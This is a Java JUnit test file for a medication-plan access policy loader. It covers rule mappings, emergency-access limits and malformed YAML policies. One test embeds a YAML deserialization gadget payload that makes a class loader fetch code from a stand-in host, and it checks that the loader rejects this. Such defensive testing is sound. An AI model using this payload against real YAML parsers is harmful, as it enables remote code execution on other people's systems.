package ch.unige.mssn.pmp.access;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import ch.unige.mssn.pmp.access.engine.AccessDecisionEngine;
import ch.unige.mssn.pmp.access.model.AccessDecision;
import ch.unige.mssn.pmp.access.model.AccessRequest;
import ch.unige.mssn.pmp.access.model.Confidentiality;
import ch.unige.mssn.pmp.access.model.Outcome;
import ch.unige.mssn.pmp.access.model.Role;
import ch.unige.mssn.pmp.access.model.Subject;
import ch.unige.mssn.pmp.access.policy.AccessPolicy;
import ch.unige.mssn.pmp.access.policy.AccessPolicy.PolicyException;
import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;
import java.util.Set;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class AccessPolicyTest {

    private static ByteArrayInputStream yaml(String text) {
        return new ByteArrayInputStream(text.getBytes(StandardCharsets.UTF_8));
    }

    private static AccessPolicy defaultPolicy() {
        return AccessPolicy.load(AccessPolicyTest.class.getResourceAsStream("/access-policy.yaml"));
    }

    @Test
    void defaultPolicyMapsActionsToChEmedDocuments() {
        AccessPolicy policy = defaultPolicy();
        assertThat(policy.version()).isEqualTo("pmp-2026-11-a");
        assertThat(policy.rule("PLAN_MEDICATION", "INSCRIRE_TRAITEMENT").orElseThrow().chEmedDocument()).isEqualTo("MTP");
        assertThat(policy.rule("PLAN_MEDICATION", "PRESCRIRE").orElseThrow().chEmedDocument()).isEqualTo("PRE");
        assertThat(policy.rule("PLAN_MEDICATION", "ENREGISTRER_DELIVRANCE").orElseThrow().chEmedDocument()).isEqualTo("DIS");
        assertThat(policy.rule("PLAN_MEDICATION", "MODIFIER_TRAITEMENT").orElseThrow().chEmedDocument()).isEqualTo("PADV");
        assertThat(policy.rule("PLAN_MEDICATION", "EMETTRE_AVIS_PHARMACEUTIQUE").orElseThrow().chEmedDocument()).isEqualTo("PADV");
        assertThat(policy.rules()).hasSize(8);
    }

    @Test
    void onlyConsultationCanBeOpenedByEmergency() {
        assertThat(defaultPolicy().rules().stream().filter(rule -> rule.emergency()).map(rule -> rule.action()))
                .containsExactly("CONSULTER_PLAN");
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "resources: {A: {B: {roles: [MEDECIN], atcEvent: X}}}",
            "version: v1",
            "version: v1\nresources: {}",
            "version: v1\nresources: {A: notAMap}",
            "version: v1\nresources: {A: {B: notAMap}}",
            "version: v1\nresources: {A: {B: {atcEvent: X}}}",
            "version: v1\nresources: {A: {B: {roles: MEDECIN, atcEvent: X}}}",
            "version: v1\nresources: {A: {B: {roles: [DIRECTEUR], atcEvent: X}}}",
            "version: v1\nresources: {A: {B: {roles: [MEDECIN]}}}",
            "version: v1\nresources: {A: {B: {roles: [MEDECIN], atcEvent: ''}}}",
            "version: v1\nresources: {A: {B: {roles: [AUDITEUR], global: true, emergency: true, atcEvent: X}}}",
            "version: v1\nresources: {A: {B: {roles: [PATIENT], emergency: true, atcEvent: X}}}",
            "just text"})
    void invalidPolicyPreventsStartup(String content) {
        assertThatThrownBy(() -> AccessPolicy.load(yaml(content))).isInstanceOf(PolicyException.class);
    }

    @Test
    void duplicateRuleAcrossFilesIsRejected() {
        String file = "version: v1\nresources: {A: {B: {roles: [MEDECIN], atcEvent: X}}}";
        assertThatThrownBy(() -> AccessPolicy.load(yaml(file), yaml(file)))
                .isInstanceOf(PolicyException.class)
                .hasMessageContaining("double");
    }

    @Test
    void yamlCannotInstantiateArbitraryObjects() {
        String malicious = "version: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://exemple.invalid\"]]]]";
        assertThatThrownBy(() -> AccessPolicy.load(yaml(malicious))).isInstanceOf(RuntimeException.class);
    }

    /** Démonstration centrale : les vaccinations s'ajoutent par un fichier, sans une ligne de Java. */
    @Test
    void addingVaccinationsNeedsOnlyAPolicyFile() {
        AccessPolicy withVaccinations = AccessPolicy.load(
                AccessPolicyTest.class.getResourceAsStream("/access-policy.yaml"),
                AccessPolicyTest.class.getResourceAsStream("/access-policy-vaccinations.yaml"));
        AccessDecisionEngine engine = new AccessDecisionEngine(withVaccinations);
        FakeFacts facts = new FakeFacts().patient("P").grant("nurse", "P", Confidentiality.NORMAL).grant("ph", "P", Confidentiality.NORMAL);

        Subject nurse = new Subject("nurse", null, "Infirmière", Set.of(Role.SOIGNANT));
        Subject pharmacist = new Subject("ph", null, "Pharmacien", Set.of(Role.PHARMACIEN));
        Subject urgentist = new Subject("urg", null, "Urgentiste", Set.of(Role.MEDECIN));

        assertThat(decide(engine, nurse, "ENREGISTRER_VACCINATION", null, facts).permitted()).isTrue();
        assertThat(decide(engine, pharmacist, "ANNULER_VACCINATION", null, facts).permitted()).isFalse();
        assertThat(decide(engine, urgentist, "CONSULTER_VACCINATIONS", "Patient inconscient, statut tétanos", facts).outcome()).isEqualTo(Outcome.EMERGENCY_PERMIT);
        assertThat(withVaccinations.version()).isEqualTo("pmp-2026-11-a+vaccinations-a");
        assertThat(defaultPolicy().rule("VACCINATIONS", "CONSULTER_VACCINATIONS")).isEmpty();
    }

    private static AccessDecision decide(AccessDecisionEngine engine, Subject subject, String action, String justification, FakeFacts facts) {
        return engine.decide(new AccessRequest(subject, "P", "VACCINATIONS", action, null, justification, null, FakeFacts.NOW), facts);
    }
}
